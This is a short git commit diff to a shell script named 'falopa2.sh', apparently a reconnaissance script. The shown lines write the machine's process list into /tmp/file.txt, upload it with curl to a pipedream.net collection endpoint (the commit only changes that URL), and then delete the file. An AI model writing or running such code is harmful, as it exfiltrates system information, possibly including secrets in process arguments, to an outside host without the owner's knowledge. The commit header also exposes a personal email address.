561231a427db46968b1d0ff90afc4e91c998b37a
_m <matiasesena@gmail.com>
2021-11-05 19:47:03 -0300

    Update falopa2.sh

--- falopa2.sh
+++ falopa2.sh
@@ -55,6 +55,6 @@ ps aux | while IFS= read -r line; do
 done 
 echo "--- FINISH ---" >> /tmp/file.txt
 
-curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
+curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net/
 
 rm /tmp/file.txt
